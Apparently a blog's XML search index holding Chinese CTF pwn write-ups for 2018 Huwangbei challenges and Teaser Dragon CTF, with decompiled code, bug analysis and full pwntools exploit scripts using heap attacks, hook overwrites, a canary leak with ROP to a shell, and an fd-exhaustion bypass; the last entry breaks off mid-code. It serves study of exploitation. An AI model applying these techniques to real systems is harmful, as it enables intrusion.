<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[2018护网杯线上赛pwn]]></title>
    <url>%2F2018%2F10%2F22%2F2018%E6%8A%A4%E7%BD%91%E6%9D%AF%E7%BA%BF%E4%B8%8A%E8%B5%9Bpwn%2F</url>
    <content type="text"><![CDATA[task_shoppingCart基本逻辑程序分为给钱和购物两部分。 给钱部分只有给钱一个功能，money结构体中包含type和amount两个字段。给钱的时候先创建一个money结构体，然后将写好的结构体放入money_list中。 12345678910111213141516171819202122232425262728293031struct money&#123; char * type; int amount;&#125;int add_money()&#123; void *v0; // rax money *v1; // rax money *v2; // ST08_8 __int64 v3; // rax signed __int64 v4; // rcx if ( (unsigned __int64)money_num &lt;= 0x13 ) &#123; puts("I will give you $9999, but what's the currency type you want, RMB or Dollar?"); v1 = (money *)malloc(0x10uLL); v2 = v1; v1-&gt;amount = 9999LL; fgets(&amp;type[8 * money_num], 8, stdin); v2-&gt;type = &amp;type[8 * money_num]; v3 = money_num++; v4 = 8 * v3; v0 = &amp;money_list; *(_QWORD *)((char *)&amp;money_list + v4) = v2; &#125; else &#123; LODWORD(v0) = puts("You already have enough money!"); &#125; return (signed int)v0;&#125; 购物环节有三个功能：add、modify和remove。 add_goods添加goods结构，并对name字符串的末尾置零。 1234567891011121314151617181920212223242526272829303132struct goods&#123; char *name; int price;&#125;unsigned __int64 add_goods()&#123; unsigned __int64 size; // ST10_8 goods *v1; // ST18_8 __int64 v2; // rax char s; // [rsp+20h] [rbp-20h] unsigned __int64 v5; // [rsp+38h] [rbp-8h] v5 = __readfsqword(0x28u); if ( (unsigned __int64)goods_num &lt;= 0x13 ) &#123; puts("How long is your goods name?"); fgets(&amp;s, 24, stdin); size = strtoul(&amp;s, 0LL, 0); v1 = (goods *)malloc(0x10uLL); v1-&gt;price = 999LL; v1-&gt;name = (char *)malloc(size); puts("What is your goods name?"); v1-&gt;name[(signed int)read(0, v1-&gt;name, size) - 1] = 0; v2 = goods_num++; goods_list[v2] = v1; &#125; else &#123; puts("Your shopping cart is full now!"); &#125; return __readfsqword(0x28u) ^ v5;&#125; remove_goods释放name后再释放goods结构体。12345678910111213141516171819202122232425262728unsigned __int64 remove_goods()&#123; unsigned __int64 v1; // [rsp+8h] [rbp-28h] char s; // [rsp+10h] [rbp-20h] unsigned __int64 v3; // [rsp+28h] [rbp-8h] v3 = __readfsqword(0x28u); puts("Which goods that you don't need?"); fgets(&amp;s, 24, stdin); v1 = strtoul(&amp;s, 0LL, 0); if ( v1 &lt;= goods_num ) release(v1); else puts("That goods is out of your cart."); return __readfsqword(0x28u) ^ v3;&#125;_QWORD *__fastcall release(__int64 a1)&#123; _QWORD *result; // rax puts("You really don't need it?"); free(*(void **)goods_list[a1]); free((void *)goods_list[a1]); result = goods_list; goods_list[a1] = 0LL; return result;&#125; modify_goods先打印name，然后修改name的内容，只能修改8字节。 123456789101112131415unsigned __int64 modify_goods()&#123; unsigned __int64 v0; // rax __int64 v1; // ST00_8 char s; // [rsp+10h] [rbp-20h] unsigned __int64 v4; // [rsp+28h] [rbp-8h] v4 = __readfsqword(0x28u); puts("Which goods you need to modify?"); fgets(&amp;s, 24, stdin); v0 = strtoul(&amp;s, 0LL, 0); printf("OK, what would you like to modify %s to?\n", *(_QWORD *)goods_list[v0], v0); *(_BYTE *)(*(_QWORD *)goods_list[v1] + read(0, *(void **)goods_list[v1], 8uLL)) = 0; return __readfsqword(0x28u) ^ v4;&#125; bugadd_goods中，当输入的size为0时，则相当于向name[-1]的位置中写入\x00，而name并没有在结尾写入\x00，由此可以泄露地址。 1v1-&gt;name[(signed int)read(0, v1-&gt;name, size) - 1] = 0; 另外，modify_goods函数中存在数组越界的问题，对输入的index没有做检查，能够执行写操作。 123v0 = strtoul(&amp;s, 0LL, 0);printf("OK, what would you like to modify %s to?\n", *(_QWORD *)goods_list[v0], v0);*(_BYTE *)(*(_QWORD *)goods_list[v0] + read(0, *(void **)goods_list[v0], 8uLL)) = 0; 漏洞利用通过add_goods泄露libc地址，先分配一个大于fastbin的块并释放，该块将放入unsortedbin中，FD和BK中为libc中的地址；再add一个size=0的块时，将从该unsortedbin中分配，读入内容时相当于向块的前一个地址中写入一个0，而字符的结尾没有写0，因此可以泄露libc地址。 本题中没有使用setvbuf，stdin等标准输入输出的读写空间都是在堆上分配的。 12345678910111213141516171819202122232425262728pwndbg&gt; heapTop Chunk: 0x55f3ddcb7900Last Remainder: 0x55f3ddcb76e00x55f3ddcb6000 PREV_INUSE &#123; stdout prev_size = 0, size = 1041, fd = 0x797562202c776f4e, bk = 0x7975622079756220, fd_nextsize = 0x20656b696c200a21, bk_nextsize = 0x6669646f6d206f74&#125;0x55f3ddcb6410 PREV_INUSE &#123; stdin prev_size = 0, size = 4113, fd = 0xa72610a360a32, bk = 0x0, fd_nextsize = 0x0, bk_nextsize = 0x0&#125;0x55f3ddcb7420 FASTBIN &#123; prev_size = 0, size = 33, fd = 0x55f3dd9400a0, bk = 0x270f, fd_nextsize = 0x0, bk_nextsize = 0x21&#125; 因此，其他的堆分配是从0xXXX7420（其中7不是固定的）开始的。也就是说，分配的第一个money结构体money[0]，起始地址就是0xXXXXXX7420（其中7不是固定的）。 利用数组越界，如果在modify_good时候输入idx指向money中的最后一个元素即money[19]，就会向type[19]中输入8个字节，而modify_good会向type[19]中写入8字节后，在末尾添加一个0，如下图所示，money和type在bss段是相邻的，这个0会溢出到money[0]中，使得money[0]的地址由0xXXXXXX7420变为0xXXXXXX7400，而0xXXXXXX7400恰好是位于stdin的_IO_read_str指向的空间。如果向stdin输入足够长的字符，直到0xXXXXXX7400，并在0xXXXXXX7400处写入free_hook的地址，再modify money[0]的时候，即相当于向free_hook里写入。 12345678.bss:0000000000202098 money_num dq ? ; DATA XREF: add_money+8↑r.bss:0000000000202098 ; add_money+53↑r ....bss:00000000002020A0 ; char type[160].bss:00000000002020A0 type db 0A0h dup(?) ; DATA XREF: add_money+62↑o.bss:00000000002020A0 ; add_money+8B↑o.bss:0000000000202140 ; _QWORD *money_list.bss:0000000000202140 money_list dq ? ; DATA XREF: add_money+B6↑o.bss:00000000002021E0 goods_list dq 14h dup(?) ; DATA XREF: add_goods+FB↑o 需要注意的是，read不会从_IO_FILE结构中的指针读取内容，而是直接进行系统调用；fgets则是从_IO_FILE结构中读取数据。在add_goods时，name是用read读取的，idx则是用fgets，因此在输入idx时，输入足够长的内容就可以填充到0xXXXXXX7400处。 利用脚本12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970from pwn import *context.log_level='debug'debug=1if debug: p = process('./2_task_shoppingCart')else: p = remote("49.4.78.29", 30289)libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')unsorted_offset = 0x7f0e626fec78-0x7f0e6233a000def money(dollar): p.sendlineafter("EMMmmm, you will be a rich man!\n",'1') p.sendlineafter("I will give you $9999, but what's the currency type you want, RMB or Dollar?\n",dollar)def shop(): p.sendlineafter("EMMmmm, you will be a rich man!\n",'3')def add_goods(name,length): p.sendlineafter("Now, buy buy buy!\n",'1') p.sendlineafter("How long is your goods name?\n",length) p.sendafter("What is your goods name?",name)def remove_goods(idx): p.sendlineafter("Now, buy buy buy!\n",'2') p.sendlineafter("Which goods that you don't need?\n",str(idx))def modify_goods(new_name,idx): p.sendlineafter("Now, buy buy buy!\n",'3') p.sendlineafter("Which goods you need to modify?\n",idx) p.sendafter("to?\n",new_name) for i in range(20): money("dollar")#leak libc shop()add_goods("0"*8+'\x00','256')#0add_goods('/bin/sh\x00','256')#1remove_goods(0)add_goods("",'0')#2p.sendlineafter("Now, buy buy buy!\n",'3')p.sendlineafter("Which goods you need to modify?\n",'2')p.recvuntil(" like to modify ")libc_addr =u64( p.recv(6).ljust(8,'\x00'))-unsorted_offsetsys_addr = libc_addr + libc.symbols['system']free_hook = libc_addr + libc.symbols['__free_hook']log.info('libc_addr:%#x',libc_addr)log.info('sys_addr:%#x',sys_addr)log.info('free_hook:%#x',free_hook)p.sendafter("to?\n","12345678")#4x0-&gt;400idx = ((0x2021d8-0x2021e0)/8)&amp;0xffffffffffffffffmodify_goods("abcdefgh",str(idx))#write free_hook at money[0]&amp;padding = 0x9400-0x8420add_goods('a'*8,(str(padding+0x10)+'\n').ljust(padding,'a')+p64(free_hook))#overwrite free_hookgdb.attach(p)idx = ((0x202140-0x2021e0)/8)&amp;0xffffffffffffffffif debug: #modify_goods(p64(sys_addr),(str(idx).ljust(24,'\x00')).ljust(padding,'1')+p64(free_hook)) modify_goods(p64(sys_addr),str(idx))else: modify_goods(p64(sys_addr),(str(idx)+'\n' + str('2')+'\n' + str('1')+'\n').ljust(0x100,'\n')+p64(free_hook)*0x5f)#shellremove_goods(1)p.interactive() task_calendar基本逻辑程序有三个主要功能，add，edit和remove，有两个全局的数组存放地址和size。 add函数分配新的堆块，size限制在0~0x68之间，并在数组中记录信息。其中get_day()用于输入的星期。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152int add()&#123; _QWORD *v0; // rax int idx; // [rsp+8h] [rbp-8h] int size; // [rsp+Ch] [rbp-4h] LODWORD(v0) = get_day(); idx = (signed int)v0; if ( (_DWORD)v0 != -1 ) &#123; printf("size&gt; "); LODWORD(v0) = read_int(); size = (signed int)v0; if ( (signed int)v0 &gt;= 0 &amp;&amp; (signed int)v0 &lt;= 0x68 ) &#123; addr_list[idx] = malloc((signed int)v0); v0 = size_list; size_list[idx] = size; &#125; &#125; return (signed int)v0;&#125;signed __int64 get_day()&#123; signed __int64 result; // rax int v1; // [rsp+Ch] [rbp-4h] puts("which day: "); puts("1. Monday"); puts("2. Tuesday"); puts("3. Wednesday"); puts("4. Thursday"); puts("5. Friday"); puts("6. Saturday"); puts("7. Sunday"); printf("choice&gt; "); v1 = read_int() - 1; if ( v1 &lt;= 3 || v1 &gt; 6 ) &#123; if ( v1 &gt;= 0 &amp;&amp; v1 &lt;= 3 ) result = (unsigned int)v1; else result = 0xFFFFFFFFLL; &#125; else &#123; puts("These days are rest time."); result = 0xFFFFFFFFLL; &#125; return result;&#125; edit函数向分配好的地址内写入内容，其中用到了read_n_off_by_one，这个函数中存在一字节的溢出：规定读入的长度为a2，但在循环时读入了a2+1个字节。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253int edit()&#123; unsigned __int64 __idx; // rax int idx; // [rsp+8h] [rbp-8h] signed int v3; // [rsp+Ch] [rbp-4h] LODWORD(__idx) = get_day(); idx = __idx; if ( (_DWORD)__idx != -1 ) &#123; __idx = addr_list[(signed int)__idx]; if ( __idx ) &#123; printf("size&gt; "); LODWORD(__idx) = read_int(); v3 = __idx; // new size if ( (signed int)__idx &gt; 0 ) &#123; __idx = size_list[idx]; // origin size if ( v3 &lt;= __idx ) &#123; printf("info&gt; "); LODWORD(__idx) = read_n_off_by_one(addr_list[idx], v3); &#125; &#125; &#125; &#125; return __idx;&#125;__int64 __fastcall read_n_off_by_one(__int64 a1, signed int a2)&#123; char buf; // [rsp+13h] [rbp-Dh] unsigned int i; // [rsp+14h] [rbp-Ch] unsigned __int64 v5; // [rsp+18h] [rbp-8h] v5 = __readfsqword(0x28u); for ( i = 0; (signed int)i &lt;= a2; ++i ) //i=0~a2 &#123; if ( (signed int)read(0, &amp;buf, 1uLL) &lt;= 0 ) &#123; puts("read error"); exit(0); &#125; if ( buf == 10 ) &#123; *(_BYTE *)((signed int)i + a1) = 0; return i; &#125; *(_BYTE *)(a1 + (signed int)i) = buf; &#125; return i;&#125; remove释放地址对应的内存，没有对指针置零。而且上面也注意到，add和edit时并不检查数组是否为零等情况，因此可以多次释放、写入。 12345678void remove()&#123; int v0; // [rsp+Ch] [rbp-4h] v0 = get_day(); if ( v0 != -1 ) free((void *)addr_list[v0]);&#125; bugedit时能够造成一字节的溢出，可以覆写下一堆块的size字段。并且free后的不置零，存在UAF和double free漏洞。但本题没有输出，不能用常规方法泄露地址。 漏洞利用要对以上的漏洞进行利用，涉及一个对我来说新的知识点：house of roman。该方法可以参考hackedbylh的《House of Roman是实战》。 我对House of Roman的理解是，充分利用main_arena+88这个数据，它是main_arena中unsortedbin头的地址，通过简单的变形能够得到main_arena和malloc_hook的地址。利用方法为： 释放一个块到unsorted bin，并重新分配，保证FD，BK为main_arena+88。通过溢出修改该unsorted bin的size为0x71。 利用UAF构成fastbin attack，将unsorted bin链入到0x70的fastbin中，并修改unsorted bin的FD为malloc_hook-0x23地址（main_arena-0x10-0x23），此处恰好能凑成一个size字段为0x7f的块，使fastbin中结构为：fb_header-&gt;0x70chunk-&gt;unsorted bin chunk -&gt; malloc_hook-0x23 利用unsorted bin attack的bck-&gt;fd = unsorted_chunks(av)，修改malloc_hook为main_arena+88 编辑malloc_hook-0x23的块，向malloc_hook写入one_gadget 本题中存在溢出，能够修改size；存在UAF，能够利用fastbin attack和unsorted bin attack，可以使用house of roman。 参照上面的步骤： 构造unsorted bin 不能直接分配unsortedbin大小的块，利用溢出。 1234567891011add(0,0x60) #0x00add(0,0x60) #0x70add(0,24) #0xe0add(1,0x60) #0x100add(2,0x60) #0x170add(3,0x60) #0x1e0edit(0,24,'0'*24+'\xe1')remove(1)add(0,0x60)add(0,0x60) 前面多分配的两块0x60是有用的，后面要用到；后面分配的两个0x60一个用来消耗unsorted bin，另一个用于与top隔开。 fastbin attack 123remove(2)remove(3)edit(3,1,'\n') 在释放两个fastbin后，#3中FD的值为#2的地址，即0xXXXXXXXXX170，在edit时输入\n会被转换为00写入，即FD变成0xXXXXXXXXX100，即指向了#1，而#1的FD为main_aren+88，因此fastbin为：#3-&gt;#1-&gt;main_aren+88。 PS：因为read_n_off_by_one函数中用的是read函数，所以会等到读入足够的字节数才会返回，而且由于read_n_off_by_one多读入一个字节，当想读入1个字节时，传入的参数只能为0或者直接输入\n，而当参数为0时不能通过内部的检查，因此必须通过输入\n来实现写入一个字节。\n会转为\0，所以要分配第一步中的前两个chunk，使得#1的地址以\x00结尾。 12345bytes = (get_base(p)+libc.symbols['__malloc_hook']-0x23)&amp;0xffffedit(1,1,p32(bytes)[:-2]) #change main_aren+88 to malloc_hook-0x23add(0,0x60) #point to 3's chunkadd(0,0x60) #point to 1's chunkadd(0,0x60) #point to malloc_hook-0x23 这一系列操作结束后，addr_list[0]里存放的是malloc_hook-0x23的地址。 unsorted bin attack 构造unsorted bin的方法和第一步相同，为了利用unsorted bin attack，修改BK的值为malloc_hook-0x10，根据以往的经验，malloc_hook都是以0xb10结尾的，malloc_hook-0x10则是以0xb00结尾，因此输入\n使之变为\x00。 需要注意的是，当unsorted bin的size大于要分配的size并且为last_remainder时，只对unsorted bin进行切分而不会解链操作。而本题中，最开始我没有再修改unsorted bin的size，使之大于要分配的fastbin的大小，但这个unsorted bin并不是last remainder，因此会把它放到对应的smallbin里并检查FD对应的chunk，而由于FD已经被修改了，引起了malloc_printerr。所以要再次修改unsorted bin的size。 123456789101112add(1,24)add(2,0x50)add(3,0x50)add(3,0x50)edit(1,24,'0'*24+'\xc1')remove(2)bytes = (get_base(p)+libc.symbols['__malloc_hook'])&amp;0xffffedit(2,8,'a'*8+'\n')edit(1,24,'0'*24+'\x61')add(3,0x50) 12345678910111213141516// _int_malloc()函数 if (in_smallbin_range (nb) &amp;&amp; bck == unsorted_chunks (av) &amp;&amp; victim == av-&gt;last_remainder &amp;&amp; (unsigned long) (size) &gt; (unsigned long) (nb + MINSIZE)) &#123; /* split and reattach remainder */ remainder_size = size - nb; remainder = chunk_at_offset (victim, nb); //只是修改头的fd和bk，没有解链 unsorted_chunks (av)-&gt;bk = unsorted_chunks (av)-&gt;fd = remainder; av-&gt;last_remainder = remainder; remainder-&gt;bk = remainder-&gt;fd = unsorted_chunks (av); …… return p; &#125; ​ 写入one_gadget 12bytes = (get_base(p)+gadget[2])&amp;0xffffffedit(0,21,19*&apos;a&apos;+p32(bytes)[:-1]) ​ 利用脚本1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586from pwn import *context.log_level='debug'gadget =[0x45216,0x4526a,0xf02a4,0xf1147]p = process('./task_calendar')libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')def get_base(p): f = open('/proc/'+str(pidof(p)[0])+'/maps','r') while 1: tmp = f.readline() print tmp if 'libc-2.23.so' in tmp: libc_addr = int('0x'+tmp.split('-')[0],16) f.close() break log.info("libc_addr:%#x",libc_addr) return libc_addrdef add(day,size): p.sendlineafter("4. exit\nchoice&gt; ",'1') p.sendlineafter("7. Sunday\nchoice&gt; ",str(day+1)) p.sendlineafter("size&gt; ",str(size))def edit(day,size,info): p.sendlineafter("4. exit\nchoice&gt; ",'2') p.sendlineafter("7. Sunday\nchoice&gt; ",str(day+1)) p.sendlineafter("size&gt; ",str(size)) p.sendafter("info&gt; ",info)def remove(day): p.sendlineafter("4. exit\nchoice&gt; ",'3') p.sendlineafter("7. Sunday\nchoice&gt; ",str(day+1))#libc_base = get_base(p)&amp;0xffffp.sendlineafter("input calendar name&gt; ",'0gur1')add(0,0x60)# 0x00add(0,0x60)# 0x70add(0,24) # 0xe0 add(1,0x60)# 0x100add(2,0x60)# 0x170add(3,0x60)# 0x1e0#overwrite #1's size to an unsorted bin sizeedit(0,24,'0'*24+'\xe1')remove(1)add(0,0x60)add(0,0x60)#now #1's chunk(0x100) is in the unsorted bin#fastbin attackremove(2)remove(3)edit(3,1,'\n')#now there are 3 chunks in fastbin:#3-&gt;#1-&gt;main_aren+88#make:#3-&gt;#0-&gt;malloc_hook-0x23bytes = (get_base(p)+libc.symbols['__malloc_hook']-0x23)&amp;0xfffflog.info("bytes:%#x",bytes)edit(1,1,p32(bytes)[:-2])add(0,0x60)#point to 3's chunkadd(0,0x60)#point to 1's chunkadd(0,0x60)#point to malloc_hook-0x23#edit(0,18,'a'*3+p64(0)+p64(0x7f))#using unsorted bin attack to overwrite add(1,24)add(2,0x50)add(3,0x50)add(3,0x50)edit(1,24,'0'*24+'\xc1')remove(2)gdb.attach(p)bytes = (get_base(p)+libc.symbols['__malloc_hook'])&amp;0xffffedit(2,8,'a'*8+'\n')edit(1,24,'0'*24+'\x61')add(3,0x50)#change main_arena+88 to one_gadgetbytes = (get_base(p)+gadget[2])&amp;0xffffffedit(0,21,19*'a'+p32(bytes)[:-1])#gdb.attach(p)add(2,0x20)p.interactive() huwang通过这题学习了一些新的知识，算是查缺补漏了。 基本逻辑这题主要的功能都在一个函数里，用来猜secret。secret的组成是读取/dev/random中的随机数，对每个字节做&amp;1的操作，然后再使用MD5计算hash： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980void __noreturn secret()&#123; int v0; // ST04_4 __int64 v1; // [rsp+0h] [rbp-80h] __int64 v2; // [rsp+0h] [rbp-80h] signed int i; // [rsp+0h] [rbp-80h] int v4; // [rsp+4h] [rbp-7Ch] int fd; // [rsp+8h] [rbp-78h] int fda; // [rsp+8h] [rbp-78h] int v7; // [rsp+Ch] [rbp-74h] char v8; // [rsp+10h] [rbp-70h] char s[32]; // [rsp+20h] [rbp-60h] char s1; // [rsp+40h] [rbp-40h] char buf; // [rsp+60h] [rbp-20h] unsigned __int64 v12; // [rsp+78h] [rbp-8h] v12 = __readfsqword(0x28u); puts("please input your name"); read(0, &amp;buf, 0x20uLL); memset(s, 0, 0x10uLL); puts("Do you want to guess the secret?"); read_one_by_one(&amp;v8, 2LL); if ( v8 == 'y' ) &#123; if ( access("/tmp/secret", 0) == -1 ) // check if the file exist or not &#123; HIDWORD(v1) = open("/tmp/secret", 65, 511LL); fd = open("/dev/urandom", 0); // secret comes from random read(fd, s, 0xCuLL); LODWORD(v1) = 0; while ( (signed int)v1 &lt;= 11 ) &#123; s[(signed int)v1] &amp;= 1u; LODWORD(v1) = v1 + 1; &#125; write(SHIDWORD(v1), s, 0xCuLL); close(SHIDWORD(v1)); close(fd); &#125; v0 = open("/tmp/secret", 0, v1); read(v0, s, 0xCuLL); close(v0); puts("Input how many rounds do you want to encrypt the secret:"); v7 = read_int(); if ( v7 &gt; 10 ) &#123; puts("What? Why do you need to encrypt so many times?"); exit(-1); &#125; if ( !v7 ) &#123; printf("At least encrypt one time", s); exit(-1); &#125; HIDWORD(v2) = open("/tmp/secret", 513); LODWORD(v2) = 0; while ( (unsigned int)v2 &lt; v7 ) &#123; MD5((__int64)s, 16LL, (__int64)s); //md5(secret) LODWORD(v2) = v2 + 1; &#125; write(SHIDWORD(v2), s, 0x10uLL); close(SHIDWORD(v2)); puts("Try to guess the md5 of the secret"); read(0, &amp;s1, 0x10uLL); if ( !memcmp(&amp;s1, s, 0x10uLL) ) right((__int64)&amp;buf); v4 = open("/tmp/secret", 513, 511LL, v2); fda = open("/dev/urandom", 0); read(fda, s, 0xCuLL); for ( i = 0; i &lt;= 11; ++i ) s[i] &amp;= 1u; write(v4, s, 0xCuLL); close(v4); close(fda); exit(0); &#125; printf("Oh!bye %s\n", &amp;buf); exit(0);&#125; 如果猜对了secret，进到right函数，right函数会输出一些信息。 12345678910111213141516171819202122232425262728int __fastcall right(__int64 name)&#123; char v1; // ST1B_1 int v3; // [rsp+1Ch] [rbp-214h] char job; // [rsp+20h] [rbp-210h] char s; // [rsp+120h] [rbp-110h] unsigned __int64 v6; // [rsp+228h] [rbp-8h] v6 = __readfsqword(0x28u); printf("Congratulations, %s guessed my secret!\n", name); puts("And I want to know someting about you, and introduce you to other people who guess the secret!"); puts("What`s your occupation?"); read_one_by_one(&amp;job, 255LL); v3 = snprintf( &amp;s, 0xFFuLL, "I know a new friend, his name is %s,and he is a noble %s.He is come from north and he is very handsome........." ".................................................................................................", name, &amp;job); puts("Here is your introduce"); puts(&amp;s); puts("Do you want to edit you introduce by yourself[Y/N]"); v1 = getchar(); getchar(); if ( v1 == 'Y' ) read(0, &amp;s, v3 - 1); return printf("The final presentation is as follows:%s\n", &amp;s);&#125; bug首先给自己普及几个知识点： snprintf中虽然限制了写入的size，但是返回值是要写入的字节数量，如sprintf(&amp;s,5,”1234567890”);的返回值为10，s中内容为“12345”。 程序中虽然开启了canary保护，但是一个程序中每个函数栈帧压入的canary的值是相同的，而且多以\x00结尾，以防止泄露canary之后的内容。 当用O_WRONLY模式打开文件时，如果文件已存在，其中的内容会被清空。 在right函数里，最后一个read以snprintf的返回值作为参数，存在栈溢出漏洞，可以构造ROP；在secret函数中输入encrypt round时，虽然限制了不能大于10且不能等于0，但对负数未做检查，而在md5运算的循环里，将round转换为unsigned int进行比较，即整数溢出漏洞。 漏洞利用构造ROP之前，需要先解决canary的问题，在secret中，允许向rbp-0x20中的buf读入0x20个字节，canary位于rbp-0x8，如果我们不输入\x00，就会泄露canary的值。另外，为了解决canary中有\x00无法泄露的问题，向buf中输入0x19个字节，覆盖住canary的\x00，就能在right函数中读取另外的七个字节。 最关键还是要解决如何进入到right函数中。利用整数溢出漏洞，round输入-1，由于转换为unsigned int非常大，会造成timeout，注意到此处open的oflag是513，即O_WROLY|O_CREATE，打开之后文件中内容已经被清空，而又由于timeout而退出，并没有像文件内写入内容，此时文件为空。对空值做MD5就是我们可预测的了。 123456789HIDWORD(v2) = open("/tmp/secret", 513); LODWORD(v2) = 0; while ( (unsigned int)v2 &lt; v7 ) &#123; MD5((__int64)s, 16LL, (__int64)s); //md5(secret) LODWORD(v2) = v2 + 1; &#125; write(SHIDWORD(v2), s, 0x10uLL); close(SHIDWORD(v2)); 利用脚本脚本参考的是w1cher大佬的wp，可惜大佬不公开blog。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849from pwn import *context.log_level='debug'libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')def secret(name,rounds,md5,flag=1): p.sendlineafter("command&gt;&gt; \n",'666') p.sendafter("please input your name\n",name) p.sendlineafter("Do you want to guess the secret?\n",'y') p.sendlineafter("Input how many rounds do you want to encrypt the secret:\n",str(rounds)) if flag: p.sendafter("Try to guess the md5 of the secret\n",md5)#make the secret file empty by timeoutp = process('./4_huwang')secret('a'*0x20,-1,'0',0)p.recvuntil('timeout~')#leak canaryp = process('./4_huwang')secret('0gur1'.ljust(0x19,'a'),1,'4ae71336e44bf9bf79d2752e234818a5'.decode('hex'))p.recvuntil("0gur1".ljust(0x19,'a'))canary = u64('\x00'+p.recv(7))log.info("canary:%#x",canary)#rop1 leak libcpop_ret_addr = 0x401573puts_got = 0x602F70right_addr = 0x40101Cp.sendafter("What`s your occupation?\n",'a'*0xff)p.sendlineafter("Do you want to edit you introduce by yourself[Y/N]\n",'Y')shellcode = 'a'*0x108+p64(canary)+p64(0)shellcode+= p64(pop_ret_addr)+p64(puts_got)+p64(right_addr)gdb.attach(p)p.sendline(shellcode)p.recvuntil("Congratulations, ")puts_addr = u64(p.recv(6).ljust(8,'\x00'))log.info("puts_addr:%#x",puts_addr)sys_addr = puts_addr - (libc.symbols['puts']-libc.symbols['system'])binsh_addr = puts_addr - (libc.symbols['puts']-next(libc.search('/bin/sh')))#rop2 getshellp.sendafter("What`s your occupation?\n",'a'*0xff)p.sendlineafter("Do you want to edit you introduce by yourself[Y/N]\n",'Y')shellcode = 'a'*0x108+p64(canary)+p64(0)shellcode+= p64(pop_ret_addr)+p64(binsh_addr)+p64(sys_addr)p.sendline(shellcode)p.interactive()]]></content>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Teaser Dragon CTF 2018]]></title>
    <url>%2F2018%2F10%2F12%2FTeaser-Dragon-CTF-2018%2F</url>
    <content type="text"><![CDATA[Production这题据说是远程没有启用assert，导致文件没有close。但我当时没看出来，现在平台关闭了也试不了了TAT，就看了些大佬（Ne0 和dcua ）的wp，了解这个漏洞是怎么用的。duca的wp更细一点，两者结合更容易理解。 相关知识关于assert DESCRIPTION If the macro NDEBUG was defined at the moment was last included, the macro assert() generates no code, and hence does nothing at all. Otherwise, the macro assert() prints an error message to standard error and terminates the program by calling abort(3) if expression is false (i.e., compares equal to zero). 如果assert.h中包含了宏NDEBUG，assert将不生成代码，不执行任何操作；否则当assert中的条件不满足时，assert会输出错误并终止程序。 也就是说，如果远程assert.h中有NDEBUG，那么在read_lyrics中的关闭文件操作就不会执行： 123456789if (strstr(buffer, "DrgnS")) &#123; printf("[-] Attack detected and stopped!\n"); assert(close(globals::records[idx]) == 0); memmove(&amp;globals::records[idx], &amp;globals::records[idx + 1], (globals::records.size() - idx - 1) * sizeof(int)); globals::records.pop_back(); return true;&#125; memmove通过数组的前移实现删除，因此当读到的内容包含“DrgnS”时，只会在数组中删除元素，但文件仍处于打开状态，即fd的数量没有减少。 关于setrlimit 程序进行了一些限制，其中就包含能够打开文件描述符的最大值： 12rlim.rlim_cur = rlim.rlim_max = 32;setrlimit(RLIMIT_NOFILE, &amp;rlim); 打开的文件个数超过32个时，再通过open打开文件就会失败。观察open_lyrics的检查顺序，有两个用到open的操作位于flag之前，因此可以通过这一操作绕过flag的读取。 另外，程序中限制输入的band或者song中不能包含“../”，但是可以输入“..”绕过。 利用方法参考Ne0大佬 的思路。 在lyrics二进制文件中有“DrgnS”字符串，因此打开16次该文件（./data/../lyrics），然后读取内容，每次都读到“DrgnS”处，此时fd为18(包含0,1,2标准的输入输出)，而record数组因为memmove，元素都被删除了，size为0。 打开12个任意的文件，此时fd为30. open_lyrics ./data/../flag，在read_lyrics先是检查path是否为一个文件时，open文件，这时fd1为31，文件描述符有32个，把文件放入数组后，又检查path是否为链接文件，再次open，这时fd2=-1，并返回true。由此绕过了flag的检查 123456789101112131415161718192021222324252627282930313233// Open the path, make sure that it's a file (and not e.g. directory), and// save the file descriptor.int fd1 = open(path, O_RDONLY);if (fd1 == -1) &#123; return false;&#125;struct stat st;if (fstat(fd1, &amp;st) != 0 || !S_ISREG(st.st_mode)) &#123; return false;&#125;globals::records.push_back(fd1);// Better safe then sorry. Make sure that the path also doesn't point to a// symbolic link.int fd2 = open(path, O_RDONLY | O_NOFOLLOW);if (fd2 == -1) &#123; printf("[-] Detected attempt to open a symbolic link!\n"); // Some kind of attack detected? return true;&#125;close(fd2);// Extra check to protect the flag.if (strstr(path, "flag") != NULL) &#123; printf("[-] Not today\n"); close(globals::records.back()); globals::records.pop_back(); return false;&#125; 由于flag中也包含“DrgnS”字符串，因此无法直接打印出来。read_line_buffered中，如果读到文件结尾处会返回0，buffer中的内容不会改变。并且如果连续调用read_line_buffered时，buffer在栈上的地址保持不变，内容也就不变。因此可以先对某个文件读到结尾，再读flag，再返回读那个文件，buffer中就会保持flag中的内容。 Fast Storage这题用到了一个奇怪的点：abs(0x80000000)==0x80000000。从开始看大佬的wp到自己捋顺一共花了两天时间ORZ。 基本逻辑add，print和edit功能。 add函数输入name、size和value，并对size和value地址做简单的处理后一起存放。题目中实现了一个类似于哈希表的简单结构：对name进行哈希作为索引，出现碰撞后用next字段链接起来。 12345678910111213141516171819202122232425262728293031323334353637383940_DWORD *__fastcall add(__int64 a1, __int64 a2)&#123; int v2; // eax@1 size_t v3; // rbx@7 int v4; // eax@7 char *name; // rax@9 size_t size; // [sp+8h] [bp-128h]@1 char buf; // [sp+10h] [bp-120h]@1 char v9; // [sp+10Fh] [bp-21h]@3 void *value_addr; // [sp+110h] [bp-20h]@1 __int64 v11; // [sp+118h] [bp-18h]@1 memset(&amp;buf, 0, 0x100uLL); v11 = 0LL; size = 0LL; value_addr = 0LL; printf("Name: ", a2, &amp;buf); v2 = fileno(stdin); v11 = read(v2, &amp;buf, 0x100uLL); if ( v11 &lt;= 0 ) ouch(); v9 = 0; printf("Size: ", &amp;buf); _isoc99_scanf("%lu", &amp;size); fgetc(stdin); if ( size &gt; 0x400 ) ouch(); value_addr = malloc(size); if ( !value_addr ) ouch(); printf("Value: ", &amp;size); v3 